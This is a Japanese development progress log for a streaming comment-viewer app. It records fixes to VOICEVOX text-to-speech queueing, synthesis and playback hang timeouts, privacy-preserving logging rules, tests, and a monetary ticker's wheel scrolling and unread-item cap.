- **既知の割り切りとして残したもの**: 前後が非英字の**単独大文字 W**（表示名 `W` 1 文字・「ビタミンW」）は
  依然「わら」になる。後方境界では防げず、防ごうとすると笑いの「WWW」を落とす副作用のほうが大きいため。
- **新規 `readingDictionary.test.ts`（34 ケース）**で回帰を固定した。041a は**これまで単体テストが無かった**
  （048/049 で `ttsQueue` にはテストが入ったが辞書側は未カバーだった）ので、その穴も同時に埋めている。
  実機で壊れた `"that clutch was insane"` と `wataru` を**そのままケースに入れて**ある。

### (2)(3) 読み上げが到着に追いつかず、課金イベントが破棄されていた

**症状**: 「同じコメント（`that clutch was insane`）が何度も読み上げられる」「課金が読まれないことがある」。

**原因は 2 つの合成**。実測して切り分けた:

- **A. dev-mock の素材偏り（dev のみ・本番では起きない）**: `MOCK_TEXTS.twitch` は 6 件あるが、`seq` が
  **両 provider 共通の単調カウンタ**なので twitch には偶数 or 奇数の seq しか来ず、`texts[seq % 6]` は
  **3 件しか出ない**。偶数側なら `that clutch was insane` は **3 回に 1 回**出る。
- **B. 読み上げが到着に構造的に追いつかない（本番でも起きる本質）**: 048 の既定 60 文字は VOICEVOX で
  10〜13 秒かかるのに、dev-mock は 1800ms 間隔／provider ＝ 両接続で 0.9 秒に 1 件。
  **1 件読む間に 5.6〜14.8 件届く**ため、キューは**定常的に満杯**で経路1（backlog 破棄）が常時発動していた。
  さらに `MAX_BACKLOG=20` は**満杯の消化に 3〜4 分**かかるので、読み上げは画面から数分遅れ、
  「今は流れていないコメントを延々読む」状態になっていた＝「同じコメントが何度も」の正体。
  **課金イベントもこの破棄に巻き込まれていた**（049 で読み上げ対象が +5〜10% 増えたのは悪化要因ではあるが、
  **元から破綻していた**＝049 の回帰ではない）。

⚠ **048 の「60 文字なら破棄 0 件」は誤り**だった。あれは「1 件の長文の直後に何件届くか」の試算で、
**定常状態の到着レートを見ていない**。60 文字でも消費（10〜13 秒/件）が到着（0.9〜1.8 秒/件）に全く追いつかない。

**修正 2 つ**（どちらも `ttsQueue.ts`）:

1. **課金専用の優先キュー**（`priorityQueue`）を追加。**破棄せず・通常キューより先に読む**。
   - 判定は **`TtsQueueOptions.isPriority` で注入**（本体は `isMonetaryEvent(c.eventType)`）＝
     **`ttsQueue` は種別を一切見ない**という 049 の設計原則を維持し、features → screens の逆転も起こさない。
   - `pump` は `priorityQueue.shift() ?? queue.shift()` に変えただけ＝**直列再生（音が重ならない）は不変**で、
     変わるのは取り出し順のみ。**未注入なら全件が通常キュー＝従来と完全に同じ**。
   - 優先キューにも `MAX_PRIORITY_BACKLOG = 50` を置いたが、これは **ENGINE 停止中の無限蓄積を防ぐ防御**で
     通常運用では到達しない。
2. **`MAX_BACKLOG` を 20 → 6**（通常チャットのみに適用）。遅延の上限が **3〜4 分 → 1 分程度**に収まり、
   常に「今」に近いコメントを読む。**依頼者の選択**（20 のまま据え置き／3 まで下げる、も提示したうえで 6 を採用）。

- **A（dev-mock の素材偏り）は直していない**。`dev-mock.ts` は dev 専用で本番の見え方に影響せず、
  修正すると sidecar の再ビルドを伴う。B を直せば「延々繰り返す」体感はほぼ解消するため。
  **再修正トリガー＝B を直しても dev で繰り返しが気になるなら、`texts[seq % n]` を provider 別カウンタにする。**
- テストは `ttsQueue.test.ts` に**優先キューの 6 ケース**を追加（バックログ超過でも課金は読まれる／課金は
  通常チャットを追い越す／優先キュー内は FIFO／通常チャットは古い方から捨てられ上限は 6+1／未注入なら従来どおり／
  `dispose` で優先キューも空になる）。

### (4) サブスク／サブギフトの Tier を日本語として自然な語順にした

**変更前**: `Aliceさんがサブスクを3ヶ月継続しましたティア2`（文が終わった後に階級が来て不自然）
**変更後**: `Aliceさんがティア2のサブスクを3ヶ月継続しました`（**依頼者の選択**。月数も読む案を採用）

- **表示は 1 ピクセルも変えていない**（`viewerFormat.ts` は差分ゼロ・画面は従来どおり `（Tier2）`）。
- 実装は `speechText.ts` の `withSpokenTier`。**「どの種別に Tier を付けるか」という表示側の判断は複製しない**
  （049 決定事項 4 の維持）＝ `composeEventMessage` を **tier あり/なしで 2 回呼び、その出力差**から
  「この種別は Tier を出すのか」を読み取る。差が無ければ表示側が付けない種別（`membership`）なので、
  たとえ `c.tier` に値が入っていても差し込まない＝**表示と読み上げで Tier の有無が食い違わない**
  （この不変条件をテストで固定した）。
- 名前の直後（`${name}さんが` の後ろ）へ差し込む。文型が想定と違えば**末尾置換（`TIER_SUFFIX_RE`）へ
  フォールバック**するので、`composeEventMessage` の書式が変わっても読み上げは壊れない（語順が旧方式へ戻るだけ）。
- 文字数は「の」の分だけ +1（要約は最長でも N+22 のまま帯域内）。

### 検証結果

`typecheck` / `lint` / `test`（**24 files / 408 tests** ＋ CSS guard）すべて green。
差分は frontend 7 ファイル（新規 `speechText.ts` / `speechText.test.ts` / `readingDictionary.test.ts`、
変更 `readingDictionary.ts` / `ttsQueue.ts` / `ttsQueue.test.ts` / `CommentViewerApp.tsx` /
`CommentViewerApp.toolbar.test.tsx`）＋ docs。**表示側 8 ファイル・`src-tauri/`・sidecar・
`package.json` / `pnpm-lock.yaml` は差分ゼロ**を実測。security.md の追記は不要（049 追補の範囲内＝
宛先・保存・ログ・依存はいずれも不変で、変わったのは読み上げの**順序と語順**だけ）。

**実機で確認すること**: (a) `was` / 英字表示名が正しく読まれるか、(b)「ティア2の」の自然さ、
(c) 課金が埋もれず読まれるか、(d) `MAX_BACKLOG=6` で通常チャットの追従感が改善したか。

## 2026-07-31 (050 読み上げの永久ハングを塞ぐ ——「可視化」をやめてスコープを 1/3 に縮めた)

### スコープを縮めた判断（本タスク最大の決定）

050 は当初「黙って諦める 3 経路をすべて**可視化**する（件数と理由を画面に出す）」計画だったが、
**着手前の棚卸しで (1) 可視化・(3) 経路3 の挙動変更・(4) MAX_BACKLOG 再評価をすべて落とした**。
判断軸は依頼者の一言 ——「**ログはいらない。ユーザーが困らないかってだけの話**」。

- **経路1（backlog 破棄）の実害は 048 / 049 / 049 フォローアップで既に解消済み**だった。
  「長文の後が読まれない」＝ 048 の 60 文字上限、「課金が読まれない」＝ 049 の優先キュー、
  「同じコメントを延々読む」＝ `MAX_BACKLOG` 20→6。**残っていたのは「破棄が見えない」ことだけ**。
- その「見えない」は**ユーザーの困りごとではない**。読み上げが到着に追いつかないのは構造的で、
  件数を見せられてもユーザーに取れる行動が無い。しかも実測どおり**常時発動**なら通知は出っぱなしになり、
  **むしろ邪魔**（＝開発者向けログを画面に出す作業だった）。
- **(4) は (1) を測定器にする前提**だったので道連れで保留。**(3) は発生未確認**のままだが、
  可視化を作らなくても**実機で背面に回して耳で聞けば判定できる**（＝コードを書く理由にならない）。

**残ったのは「読み上げが止まったまま二度と復帰しない」経路だけ**。ここだけがユーザーの実害なので、
本タスクは**永久ハングの 2 経路を塞ぐこと**に絞った。差分は frontend 2 ファイル＋テスト 2 ファイル。

### 塞いだ 2 経路（どちらも `playing` が true 固定＝アプリ再起動以外に復帰手段が無かった）

**A. 合成が返らない**（`SYNTH_TIMEOUT_MS = 10_000`・`ttsQueue.ts`）

- 塞いだのは「**ENGINE が生きているのに応答を返さない**」ケース（スリープ復帰後・モデルロードのスタック等）。
  ENGINE の停止・クラッシュは**接続拒否で即エラー**になり既存 catch → `engineBanner` → 自動起動が働くので
  元から詰まらない＝**対象外**（ここを混同すると「バナーと二重に通知が出る」設計に迷い込む）。
- ⚠ **この経路は無音になるだけでなく「気付けない」**。`checkEngineRunning`（`GET /version`）にも
  タイムアウトが無いので、ENGINE が同じく無反応なら `engineRunning` が更新されず**起動誘導バナーすら出ない**。
- **タイムアウトは 2 回の fetch（`/audio_query` → `/synthesis`）と body 読みの合計に掛ける**。
  守りたい不変条件が「1 件が 10 秒以上詰まらない」なので、合計予算として持つのが自然
  （per-request 化は `voicevox.ts` 側の改造が要るうえ、不変条件が言いにくくなる）。
- **タイムアウトと通常の合成失敗を区別しない**。通知を作らない以上区別する意味が無く、abort は
  `AbortError` として**既存の catch にそのまま落ちる**（`console.error` → `finally` で `playing = false` → 次へ）。
  ＝**新しい分岐もフラグも増えない**。当初計画にあった `timedOut` フラグは可視化と一緒に不要になった。
- **既定 10 秒の根拠**: 1 件の読み上げ所要（048 の既定 60 文字＝10〜13 秒）と同オーダーに置き、
  「最悪でも 1 件分余計に待つだけ」という説明可能な上限にする。ENGINE 起動直後の初回合成
  （モデルロード）を誤って切らない余裕も要る。**再調整トリガー＝正常運用で読み上げが飛ぶなら伸ばす。**
- `clearTimeout` は **`synthesize` を包む内側の `try/finally`**。合成が終われば役目は終わりで、再生中
  （最長で数十秒）まで残すと 1 件ごとに宙ぶらりんのタイマーを抱える。⚠ 当初「残すと合成の abort が
  再生の失敗に化ける」と書いたが**それは誤り**（controller が別なので実害は無い）＝予防的な作法として実施。
- `dispose` では**従来どおり中断しない**（`disposed` ガードのまま）。235 行付近のコメントを
  「**dispose 中断とタイムアウト中断は別目的**・signal を混ぜない」へ更新した。

**B. 再生が終わらない**（`PLAYBACK_STALL_CHECK_MS = 1000`・`ttsQueue.ts` ＋ `voicevox.ts`）

- **タスクファイルに無かった穴**。再生中に AudioContext が suspended になると `src.onended` が発火せず、
  `playWav` の Promise が永久 pending になる。`pump` 冒頭のガード（032c-b）は**再生前しか見ない**ので素通りする。
- **時間では切らない**（まだ鳴っている音を打ち切ってしまう）。**`ctx.state` が running でなくなったこと**＝
  **音が出ていない**ことを条件に打ち切るので、**打ち切りが音を切らないし、次の 1 件と重ならない**。
  これが「再生にタイムアウトを付けてはいけない」と「再生が詰まると全部詰まる」を両立させる唯一の軸。
- 打ち切りでは **`stop()` ＋ `disconnect()` まで行う**（`voicevox.ts`）。stop だけだと、後で `ctx.resume()` された
  瞬間にこの source が息を吹き返し、既に次の 1 件を再生している `ttsQueue` と**音が重なる**。
  **reject ではなく resolve** する（打ち切りは異常ではないので既存 catch のログを汚さない）。
- **`statechange` イベントではなくポーリング**（1 Hz・再生中だけ）。塞ごうとしている相手が
  「**発火するはずの `onended` が発火しない**」ケースである以上、命綱をイベントの発火に預けない。
- 打ち切った次の 1 件は**既存の再生前ガード**（resume を試す／ダメならその 1 件をスキップ＝経路3）に入る。
  **経路3 の挙動は 1 文字も変えていない**（発生確認前に触らない、を守った）。

### 残す既知の挙動（意図的な未対応）

- **経路3（再生前 suspended の 1 件スキップ）は未変更・発生未確認**。suspended が続く間はキューが
  無言で消費される。**実機で「背面に回してから戻す」を試して発生の有無を確定させてから** (3) を判断する。
- **`MAX_BACKLOG` は 6 のまま**（実測していないので変えない）。可視化を作らない判断をしたので、
  再評価は**体感**（画面に出てから読まれるまでの遅延）で行う。判定材料: `MAX_BACKLOG=N` の最悪遅延は
  ≒ (N+1)×10〜13 秒（N=6 で **70〜91 秒**）。⚠ **スキップ率は流量が消費を上回る限り N を増やしても減らない**
  （遅延だけが伸びる）ので「捨てられているから増やす」は誤り。**増やす価値があるのは取りこぼしが
  間欠的（バースト起因）なときだけ**で、定常的に追いつかないなら据え置きか減らす。
- **`console.debug` を 1 行だけ増やした**（再生打ち切り時）。出るのは事象名のみで、**本文・投稿者名・URL は
  一切含まない**（§9 維持）。`voicevox.ts` は**ログ 0 行のまま**（`grep console` で実測）。

### テスト（`voicevox.ts` に初めて単体テストが入った）

- `ttsQueue.test.ts` に **fake timers 専用の describe を新設**（既存 2 describe は real timers のまま。
  fake timers 下では `setTimeout(resolve, 0)` の flush が進まないので `vi.advanceTimersByTimeAsync` に置換）。
  `FakeAudioContext` に `static last` を足して**再生中に `state` を suspended へ落とせる**ようにした
  （`createTtsQueue` は AudioContext を内部で作って外へ出さないため、これ以外に掴む手段が無い）。
  5 ケース: 合成が返らなくても次へ進む／**正常終了後にタイマーが残らない**（`vi.getTimerCount()===0`）／
  再生中の停止で打ち切って次へ／**動いている限り長い再生を時間で切らない**（29 秒経っても abort しない）／
  合成が例外でも直列が止まらない。
- **新規 `voicevox.test.ts`**（3 ケース）: 打ち切りで `stop()`＋`disconnect()` を呼んで解決する／
  打ち切り済み signal では鳴らさない／通常時は `onended` で解決し `stop()` を呼ばない。
  **「音が重ならない」保証はここでしか見られない**ため、未カバーだった `voicevox.ts` に初めてテストを入れた。
- **ミューテーション 3 パターンで実効性を確認**（signal を渡さない → 合成タイムアウトのケースが落ちる／
  再生 signal を渡さない → ストール検知のケースが落ちる／`disconnect()` を消す → `voicevox.test.ts` が落ちる）。

### 検証結果

`typecheck` / `lint` / `test`（**25 files / 416 tests** ＋ CSS guard）すべて green（049 フォローアップ時点は
24 files / 408 tests）。差分は frontend 4 ファイル（`ttsQueue.ts` / `voicevox.ts` / `ttsQueue.test.ts` ＋
新規 `voicevox.test.ts`）のみ。**`src/screens/`（`CommentViewerApp.tsx` 含む）・`src-tauri/`・sidecar・
`package.json` / `pnpm-lock.yaml` は差分ゼロ**を実測。新規依存・新規外部通信・capability の追加なし、
`csp: null` 不変、security.md の更新不要（宛先・送る内容・保存・ログのいずれも変えていない）。

**実機で確認すること**: (a) VOICEVOX 停止で読み上げ ON → 1 件で固まらず次へ進み、出るのは既存バナーだけか
(b) 通常運用で読み上げが**飛ばない**（＝10 秒が短すぎない）か。⚠ **ENGINE 起動直後の 1 件目**を必ず含める
（モデルロードが 10 秒を超えていると「起動して最初のコメントだけ読まれない」という、通知が無い以上いちばん
原因に辿り着きにくい形で出る） (c) **背面に回してから戻すと読み上げが再開するか**
（＝B の発生有無と経路3 の発生有無をここで確定させる）。049 フォローアップの積み残し (a)〜(d) と同時に行う。

### 050 レビュー対応（セキュリティ／品質・2026-07-31）

**セキュリティは問題なし**。049 で「新規宛先・保存・ログがゼロだから security.md 無変更でよい」と整理して
**§1 の条文（合成対象はコメント本文のみ・著者名は送らない）を見落とした**前例があるため、今回は条文に
**1 行ずつ当てて**独立に再検証した。結論として**今回の変更は条文のどれにも触れない**——049 は
「**何を送るか**」を増やした（著者名）ので条文変更が必要だったが、050 は「**いつ送るのをやめるか**（打ち切り）」
しか変えていない。条文は「送ってよいものの上限」を定めるものなので、**送る量を減らす方向の変更は原理的に
条文に触れない**。この論法は再現可能で、「新規宛先ゼロだから」という 049 の誤った整理とは別物。
§9（`voicevox.ts` は `console.*` 0 件）・§10（依存差分ゼロ）・`csp: null` 不変・`src-tauri/`／sidecar／
`src/screens/`／`package.json` の差分ゼロもすべてコマンド出力で実測した。

**要修正 1 件（Q-1）を修正**: **`playWav` の abort ハンドラが例外安全でなかった**。`src.disconnect()` が
投げると `resolve()` に到達せず、**ハング防止のコードが永久ハングを作る**。しかも `await playWav` が解けない
ので呼び出し側の `finally { clearInterval(stallTimer) }` にも到達できず、**1 Hz の watchdog が回り続ける**
（毎秒 `console.debug`）。一時テストで**実測再現済み**——例外は abort イベントのディスパッチに飲まれて
`controller.abort()` は正常復帰するため、呼び出し側からは一切見えない。
`disconnect()` は仕様上投げないが、**`stop()` だけ try/catch してある非対称**が「この文脈は状態が読めない」
という判断の証拠であり、**`ctx.close()` 済み（dispose 経路）でこのハンドラが走る経路は実在する**（実行環境は
WKWebView）。代償が「機能の存在理由が消える」なので修正した。後始末全体を try/catch で包み、
**何があっても `resolve()` に到達**させる。⚠ **`finally { resolve() }` では不十分**だった——解決はするが例外が
リスナ外へ escape し、vitest が exit 1 になる（＝本番では `window.onerror` に飛ぶ）。後始末の失敗は解決さえ
していれば実害が無いので、外へ出さない形にしてある。`stop()` の内側 try/catch を残したのは、
**stop の失敗で `disconnect()` を飛ばさない**ため（音が重ならない保証は disconnect の側にある）。

**回帰テスト 2 ケース追加**（`voicevox.test.ts`・どちらもミューテーションで落ちることを確認済み）:
打ち切り処理が途中で投げても解決する（防御を外すと 5 秒でタイムアウト＝ハング再現）／**正常終了後は
abort リスナが外れている**（`removeEventListener` を消すと落ちる。長時間配信でリスナが増え続けないことの担保で、
従来は 1 ケースも固定していなかった）。

**軽微 5 件はコメント化**（コードを直さず意図・理由・再修正トリガーを残した）:
- `SYNTH_TIMEOUT_MS` が**合成 1 件の実測に基づく値ではない**（比べているのは*再生*時間 10〜13 秒であって
  *合成*時間ではない＝余裕があるのは結果論）ことと、それでも安全側に倒す理由（**リスクが非対称**＝長すぎても
  最悪 1 件分待つだけだが、短すぎると正常な読み上げが恒常的に飛び、通知が無いので気付けない）、
  再調整トリガー 3 つ（実測値が出たら引き直す／起動直後の 1 件目が読まれないなら伸ばす／飛ぶなら伸ばす）。
- `PLAYBACK_STALL_CHECK_MS` に**塞げない残り**（`ctx.state` が running のまま `onended` 不発・
  **`decodeAudioData` が返らない**ケースは依然ハングする）と、**猶予（連続判定）を入れていない**割り切り
  （出力デバイス切替等で一瞬 suspended になるとまだ聞ける音を落とすが実害は 1 件）＋各再検討条件。
- `dispose` では**合成は中断しないが再生は間接的に打ち切られる**ようになった旨（`ctx.close()` → watchdog）。
  従来は `onended` が来ず `playWav` が pending のまま残っていたので**意図した改善**だが、既存コメントの
  「dispose では中断しない」だけを読むと誤読するため明記した。
- watchdog の `console.debug` を **`dispose` 中は出さない**ようにした（`ctx.close()` は正常な後始末であって
  ストールではない＝事象名と食い違うログを出さない・§9）。abort 自体は dispose でも必要なので残してある。
- `synthesize` の JSDoc に「**この URL には読み上げ全文（049 以降は投稿者名を含む）が載るのでここにログを
  足さない**」＋ DevTools のネットワークパネルにはブラウザ機能として URL が出る（アプリのログではないので
  §9 の対象外だが、診断のスクショ共有時は写り込みに注意）。

**別タスク起票（051）**: `checkEngineRunning`（`GET /version`）のタイムアウト無し。050 で「直さない」と判断
したこと自体は妥当（`src/screens/` 差分ゼロを優先・症状も別）だが、**この progress.md の散文 1 行にしか
残っておらず task-board に行が無かった**＝次に誰も拾わない状態だったので起票した。あわせて
`CommentViewerApp.tsx` のポーリング effect のコメント（「応答は即時」「再検討条件＝応答遅延で tick が
滞留するなら…」）が**現状と食い違っている**ことも記録した——050 はまさにその再検討条件が満たされている
前提で作られたタスクなので、前提が崩れている。

**もう 1 つの補足（判断の再構成のため）**: 今回の A/B は**「1 件を黙って捨てる」経路を 2 つ増やしている**。
従来はハングしていた＝ユーザーは「止まった」と気付けたが、今は黙って次へ進むので「なぜこのコメントだけ
読まれなかったのか分からない」が**新規に発生する**。トレードオフとしては圧倒的に正しい（ハングの方が
桁違いに悪い）が、(1) 可視化を不採用にした根拠は**経路1 についてしか書いていなかった**ので明記しておく。
A/B が作る不可視破棄についても判断は同じ＝**ユーザーに取れる行動が無い**（ENGINE が応答しない・音声が
止まっている、はどちらも既存のバナー／OS 側の状態で分かる）ため、可視化不採用を維持する。
再検討条件＝実機で「読まれないコメントがある」が**ハング解消後も**体感として残るなら、そこで初めて考える。

**docs の訂正**: 050 タスクファイルの「必読前提」から**行番号を削除**し、シンボル名だけにした
（**この実装自身が行番号をずらした**ため。同じ問題が毎回起きるので、書かない方針に変えた）。

**検証**: `typecheck` / `lint` / `test`（**25 files / 418 tests** ＋ CSS guard）すべて green。
レビュー時にミューテーション 3 パターン（合成 signal / 再生 signal / `disconnect()`）の再現も確認済みで、
それぞれ対応する 1 ケースだけが落ちることを実測した。

### 050 テスト補強（仕様ベースで未固定だった箇所・2026-07-31）

レビュー後、**仕様（050 タスクファイル／security.md §1 例外 032c-c ＋ 049 追補／§9）に書かれているのに
テストが 1 件も無かった項目**を洗い出して 16 ケース追加した（**418 → 434 tests**）。追加分は
**8 パターンのミューテーションで実効性を確認済み**（それぞれ意図したケースだけが落ちることを実測）。

**`ttsQueue.test.ts`（+11）**
- **`SYNTH_TIMEOUT_MS` の値そのものを仕様として固定**（9 秒では切らない／10 秒で切る）。従来は
  `advanceTimersByTimeAsync(10_000)` で進めるだけだったので、**定数を 1 秒に変えても 1 件も落ちなかった**。
  ⚠ 「切る」側だけでなく「**切らない**」側を固定したのが要点——短すぎると正常な読み上げが恒常的に飛び、
  通知が無いのでユーザーは気付けない（レビュー Q-2 のリスク非対称性）。定数を変える人がここで必ず気付く。
  `SPEECH_ELLIPSIS` と同じ作法で**意図的にリテラル**（import すると恒真式になる）。
- **タイムアウトは 1 件ごとに張り直される**（前の 1 件の待ち時間を持ち越さない）。守りたい不変条件が
  「**1 件が** 10 秒以上詰まらない」であって、キュー全体の予算ではないことの固定。
- **打ち切った後も直列が健在**（打ち切り → 残り 2 件が続けて読まれる）。
- **合成中に dispose されたら結果を再生しない**。「dispose では合成を中断しない」という設計が成立する
  **根拠そのもの**（中断しない代わりに `disposed` ガードで再生を抑止する）なのに未固定だった。
- **dispose 中の in-flight 再生が打ち切られ、見張りタイマーも残らない**（レビュー Q-4 の「意図した改善」）。
- **§9 のログ 6 ケース**（新設 describe）: backlog 破棄／合成失敗／**合成タイムアウト（AbortError）**／
  再生打ち切り のいずれのログにも**読み上げテキスト（投稿者名を含む）が現れない**こと、
  **dispose による打ち切りを「ストール」として記録しない**こと、**打ち切りログが毎秒出続けない**こと。
  ⚠ 「デバッグのためにログへ本文を 1 つ足す」は**最もやりがちな §9 退行**なので、実行時の不変条件として
  固定した（差分レビューの grep はレビューを通らない変更を止められない）。

**`voicevox.test.ts`（+5）**
- **`stop()` が失敗しても `disconnect()` は実行する**。打ち切りの 2 つの後始末のうち、
  **音が重ならない保証は disconnect の側**にあるので、stop の失敗で巻き添えにしてはいけない
  （レビュー Q-1 の修正で内側 try/catch を残した理由そのもの）。
- **`decodeAudioData` には複製を渡す**（`wav.slice(0)`＝入力 ArrayBuffer を破壊的に消費する実装への対策）。
  既存仕様だが未カバーだった。
- **`voicevox.ts` はログを持たない**（新設 describe）: `playWav` は正常再生でも打ち切りでも `console` を
  呼ばない／`synthesize` は失敗しても `console` を呼ばず、**Error に載せるのは status だけ**
  （読み上げテキストも宛先 URL も含めない）。050 タスクファイルの「現状 `voicevox.ts` はステータス番号だけを
  載せている＝**この状態を維持する**」を実行時に固定したもの。合成 URL は
  `?text=<encodeURIComponent(読み上げ全文)>` で**投稿者名まで含む**ため、ここが最も重い。
  `fetch` は `vi.stubGlobal` で差し替え＝**loopback 50021 へも出さない**。

## 2026-07-31 (047f 課金ティッカーの実機不具合 2 件 —— ホイール横移動と、未読 50 件の壁)

E2E で 2 件報告された。どちらも**過去の修正が別の環境・別の規模を落としていた**もので、症状より真因のほうが重い。

### ① マウスのホイールで帯を横移動できない

**真因は 047d の副作用**。047d は「横スクロールバーが帯の内側の高さを食ってピルが上下に切れる」不具合を
スクロールバーを消すことで直した（判断は正しい）。そのときの申し送りが問題だった:

> 操作性は落とさない: ピルは実 `<button>` なので Tab で自動横スクロールし、トラックパッド/Shift+ホイールの
> 横スクロールも効く。

**マウス（ホイールのみ）が想定から漏れている**。スクロールバーも消えているので、マウス利用時は横へ動かす
手段が実質ゼロだった（Tab キーのみ）。⚠ **047d 自身が「依頼者の環境はマウス接続」と明記していた**
（macOS のスクロールバー設定の話で）のに、その環境を落としている。

**修正**: 縦ホイールを横スクロールへ変換する。実装上の罠が 2 つあり、素直に書くと動かない。

- **(a) React の `onWheel` は使えない**。React は `wheel` を root へ **passive** で登録するため、ハンドラ内の
  `preventDefault()` が無視される＝親が縦に動くのを止められない。`addEventListener(..., { passive: false })`
  を自分で張る必要がある。
- **(b) `useRef` ＋ `useEffect([])` では付かない**。`MonetaryTicker` は課金 0 件のとき `return null` し、
  ティッカーは「初回 0 件 → 課金が来て初めて描画」なので、`[]` deps の effect は **ref が null の初回に
  1 度走って終わり**、実際のトラックには一生 listener が付かない。→ **callback ref**（React 19 は
  クリーンアップ関数を返せる）で attach/detach する。

挙動の決め: `deltaX` があるときは触らない（トラックパッドの横スワイプはブラウザ標準が動かすので倍速にしない）
／**実際に動かせるときだけ `preventDefault()`**（溢れていない・端に達しているときは既定動作へ流す＝標準の
スクロールチェーン。常に止めるとピルが少ないときホイールが「死んだ」ように感じる）／`DOM_DELTA_LINE` は
16px 換算（Windows のマウスで出る）。**CSS は 1 行も触っていない**（スクロールバーは戻さない＝047d の再発）。

### ② 未読数が 50 件以上数えられない

**バッジの頭打ちは症状の一部でしかない**。真因は `MONETARY_MAX = 50` のクランプで、本体は
**未読のまま帯から消えた投げ銭は二度と押せない＝見逃す**こと。

⚠ これは `monetaryFeed.ts` の docstring 自身が `MAX_COMMENTS`(=200) について警告している内容と**同じ壊れ方**:

> 本機能の目的は「流れて消える一覧の中で投げ銭を見失わないための常時表示」なので、それは目的を直接壊す

**200 件クランプを避けるために作ったモジュールが、自前の 50 件クランプで同じ穴を開けていた。**

**修正**: **未読は上限で捨てない**（捨てるのは既読から古い順）。049 フォローアップで TTS に入れた
「課金は捨てず先に読む優先キュー」と**まったく同じ判断軸**＝未読は「まだ見ていない投げ銭」＝この機能の
存在理由そのものなので捨てない、既読は「もう見た」＝参考情報なので捨てる。

- 結果として「**未読数 ＝ 押せるピルの数**」が常に一致する（押せない未読が生まれない）。
- 総数は `max(未読数, MONETARY_MAX)`。絶対上限は新設 **`MONETARY_HARD_MAX = 500`**（TTS の
  `MAX_PRIORITY_BACKLOG` と同じ「通常運用では到達しない防御値」＝そこまで来たら見逃し防止より資源が優先）。
- 通常運用ではピルを押すたび既読化されるので、総数は 50 前後へ収束する。500 に張り付くのは
  「一度も押していない」異常系だけ。**再調整トリガー＝張り付くなら上限を上げるのではなく「押させる導線」を疑う。**
- `mergeMonetary` の第 3 引数 `isRead` は **optional ＝ 未注入なら従来と完全に同じ**（`ttsQueue` の getter 群と
  同じ作法で、既存の呼び出しとテストが壊れない）。
- 既読集合は `setMonetary` の updater 内で読むので `readMonetaryIdsRef` を同期した。⚠ **ref の 1 レンダー
  遅れは「捨てすぎる」方向ではなく「残しすぎる」方向にしか効かない**（既読化をまだ知らない＝未読扱い＝
  捨てない）ので、未読を落とさないという目的に対して**安全側に倒れている**＝同期の厳密化は不要。

### セキュリティ（条文には触れないが、判断として記録する）

新規の外部通信・保存・ログ・依存はゼロで、`docs/security.md` の「レビュー必須条件」には該当しない
（`src-tauri/`・sidecar・`package.json`・`security.md` は差分ゼロを実測）。

ただし **047 のセキュリティレビュー S-1 で明示的に議論された論点の前提が変わる**:

> 「永続しない」は**ディスクに残らない**であって「画面から消える」ではない。（…）ティッカーは配信 1 本の
> あいだ**最大 50 件**を出しっぱなしにする＝画面滞在時間は明確に伸びている。（…）配信者が**画面全体
> キャプチャ**を使う場合は視聴者名＋金額が配信中ずっと映る。

未読を捨てなくすると、この「最大 50 件」が未読ぶん増える（防御上限 500 まで）。§9 追補（046a）の発火条件は
**永続化**なので条文には該当せず、露出の**種類**も増えていない（表示名・金額・アバターで 047 と同じ）が、
**量**は増える。据え置く理由は、減らす方向＝「未読を黙って消す」が今回直した不具合そのものだから。
再修正トリガー＝「ティッカーを OBS オーバーレイにも出したい」要望が出たとき（046b S-1 と同じ土俵＝
§9 追補の対象になるので security-review を通すこと）。

### テスト

**+11 ケース**（`monetaryFeed.test.ts` +6 / `MonetaryTicker.test.tsx` +5）。**4 パターンのミューテーションで
実効性確認済み**（`ref={setTrack}` を外す／`deltaX` ガードを外す／端チェックを外す／未読を捨てない規則を外す
→ それぞれ対応するケースだけが落ちる）。

⚠ jsdom はレイアウトを持たない（`scrollWidth`/`clientWidth` は常に 0）ので、ホイール側は**寸法を明示注入して
ハンドラの契約だけ**を固定している（動く・トラックパッドを邪魔しない・溢れていない/端では既定へ流す・
行単位を px 換算する）。**実際の操作感は E2E（実機）の担当**で、そこはユニットでは代替できない。

`typecheck` / `lint` / `test`（**25 files / 445 tests** ＋ CSS guard）すべて green。

### E2E（手動）確認チェックリスト —— 047f

> ⚠ **本タスクは E2E で見つかった不具合の修正なので、修正自体が実機で未確認**。外部レビューの指摘
> （「050 だけ 10 項目の手順があり、047f/051 は箇条書き 1 行だった」）を受けて 050 と同じ粒度へ揃えた。
> 準備は 050 の E2E 節と同じ（`COMMENT_SIDECAR_MOCK=1 pnpm tauri dev`＋DevTools）。

**F-1 マウスのホイールで帯が左右に動く**
- 手順: 課金コメントをピルが溢れる数（10 件以上）ためる → **マウスのホイール**をティッカーの上で回す。
- 期待: 帯が左右にスクロールする。**端に達したらそこから先は一覧側が縦に動く**（スクロールチェーン）。
- 失敗したら: 動かない＝`ref={setTrack}` が付いていない／React の `onWheel` に戻っている（`preventDefault`
  が無視される）。端で一覧が動かない＝端チェック（`next === el.scrollLeft` の早期 return）が消えている。

**F-2 トラックパッドの横スワイプが倍速にならない**
- 手順: トラックパッドで帯を横スワイプする。
- 期待: 従来どおりの速さで動く（ブラウザ標準の 1 回だけが効く）。
- 失敗したら: 倍速になる＝`deltaX !== 0` の早期 return が消えている。

**F-3 未読が 50 件を超えて数えられ、そのすべてを押せる**（本タスクの核心）
- 手順: 課金コメントを **60 件以上**ためる（mock なら流しっぱなしにする）。**1 つも押さない**。
- 期待: 「未読 60」以上が出る。**帯を端まで送ると 60 個すべてのピルが実在し、すべて押せる**
  （＝「未読数 ＝ 押せるピルの数」）。
- 失敗したら: 「未読 50」で頭打ち＝`mergeMonetary` への `isRead` 注入が消えている（配線テストで検知
  できるようにしたが、実機でも必ず見る）。数字は 60 なのにピルが 50 個＝クランプ規則の実装ミス。

**F-4 押して既読にすると総数が 50 前後へ戻る**
- 手順: F-3 の状態からピルを順に押していく。
- 期待: 既読が増えるにつれ**古い既読から消え**、総数が `MONETARY_MAX`(=50) 前後へ収束する。
  未読は消えない。
- 失敗したら: 未読が消える＝クランプの `excess` の扱いを疑う。総数が減らない＝既読判定
  （`readMonetaryIdsRef` の同期）を疑う。

**F-5 `MONETARY_HARD_MAX`(=500) は実運用で踏まないこと**の確認（任意・長時間）
- 期待: 通常の配信では到達しない。到達するなら**上限を上げるのではなく「押させる導線」を疑う**。

## 2026-07-31 (051 その配信の初コメントに「初コメ」バッジ＋初見と同じ枠色)

